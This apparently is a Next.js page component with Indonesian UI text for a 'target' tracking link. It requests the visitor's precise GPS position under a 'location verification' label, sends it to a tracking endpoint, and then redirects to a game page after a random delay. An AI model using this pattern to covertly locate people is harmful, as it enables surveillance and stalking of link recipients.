'use client'

import { useEffect, useState, use, useRef } from 'react'
import { useRouter } from 'next/navigation'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { MapPin, Loader2, CheckCircle, XCircle, AlertCircle } from 'lucide-react'

type LocationState = 'requesting' | 'granted' | 'denied' | 'error' | 'unsupported'

export default function TargetPage({ params }: { params: Promise<{ id: string }> }) {
  const { id } = use(params)
  const router = useRouter()
  const [locationState, setLocationState] = useState<LocationState>('requesting')
  const [message, setMessage] = useState('Memuat halaman...')
  const [countdown, setCountdown] = useState<number | null>(null)
  const visitSent = useRef(false)
  const redirectScheduled = useRef(false)

  useEffect(() => {
    if (visitSent.current) return
    visitSent.current = true

    const sendVisit = async (locationData?: { latitude: number; longitude: number }) => {
      try {
        await fetch(`/api/tracking/${id}/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(locationData || { locationStatus: 'pending' })
        })
      } catch (error) {
        console.error('Error sending visit:', error)
      }
    }

    const requestLocation = () => {
      if (!navigator.geolocation) {
        setLocationState('unsupported')
        setMessage('Browser Anda tidak mendukung geolokasi')
        sendVisit()
        scheduleRedirect()
        return
      }

      setMessage('Meminta izin lokasi...')
      
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          setLocationState('granted')
          setMessage('Lokasi berhasil didapatkan!')
          
          await sendVisit({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
          
          scheduleRedirect()
        },
        async (error) => {
          console.error('Geolocation error:', error)
          
          if (error.code === error.PERMISSION_DENIED) {
            setLocationState('denied')
            setMessage('Izin lokasi ditolak')
          } else if (error.code === error.POSITION_UNAVAILABLE) {
            setLocationState('error')
            setMessage('Lokasi tidak tersedia')
          } else {
            setLocationState('error')
            setMessage('Gagal mendapatkan lokasi')
          }
          
          await fetch(`/api/tracking/${id}/visit`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ locationStatus: 'gagal' })
          })
          
          scheduleRedirect()
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      )
    }

    const scheduleRedirect = () => {
      if (redirectScheduled.current) return
      redirectScheduled.current = true

      // Random delay between 3-10 seconds for demo (in production: 10-360 minutes)
      const delaySeconds = Math.floor(Math.random() * 7) + 3
      setCountdown(delaySeconds)

      const interval = setInterval(() => {
        setCountdown(prev => {
          if (prev === null || prev <= 1) {
            clearInterval(interval)
            router.push(`/t/${id}/game`)
            return null
          }
          return prev - 1
        })
      }, 1000)
    }

    // Start the flow
    requestLocation()
  }, [id, router])

  const getIcon = () => {
    switch (locationState) {
      case 'requesting':
        return <Loader2 className="h-12 w-12 animate-spin text-primary" />
      case 'granted':
        return <CheckCircle className="h-12 w-12 text-green-500" />
      case 'denied':
        return <XCircle className="h-12 w-12 text-red-500" />
      case 'error':
      case 'unsupported':
        return <AlertCircle className="h-12 w-12 text-yellow-500" />
    }
  }

  return (
    <main className="min-h-screen flex items-center justify-center p-4 bg-muted/30">
      <Card className="w-full max-w-md text-center">
        <CardHeader>
          <div className="mx-auto mb-4">
            {getIcon()}
          </div>
          <CardTitle className="flex items-center justify-center gap-2">
            <MapPin className="h-5 w-5" />
            Verifikasi Lokasi
          </CardTitle>
          <CardDescription>
            {message}
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {countdown !== null && (
            <div className="space-y-2">
              <p className="text-sm text-muted-foreground">
                Anda akan dialihkan ke halaman berikutnya dalam
              </p>
              <div className="text-4xl font-bold text-primary">
                {countdown}
              </div>
              <p className="text-xs text-muted-foreground">detik</p>
            </div>
          )}
          
          {locationState === 'requesting' && (
            <p className="text-sm text-muted-foreground">
              Mohon izinkan akses lokasi untuk melanjutkan
            </p>
          )}

          {locationState === 'denied' && (
            <div className="space-y-2">
              <p className="text-sm text-muted-foreground">
                Anda menolak izin lokasi. Proses tetap akan dilanjutkan.
              </p>
              <Button 
                variant="outline" 
                onClick={() => window.location.reload()}
              >
                Coba Lagi
              </Button>
            </div>
          )}

          {locationState === 'granted' && (
            <p className="text-sm text-green-600">
              Terima kasih! Lokasi Anda telah tercatat.
            </p>
          )}
        </CardContent>
      </Card>
    </main>
  )
}
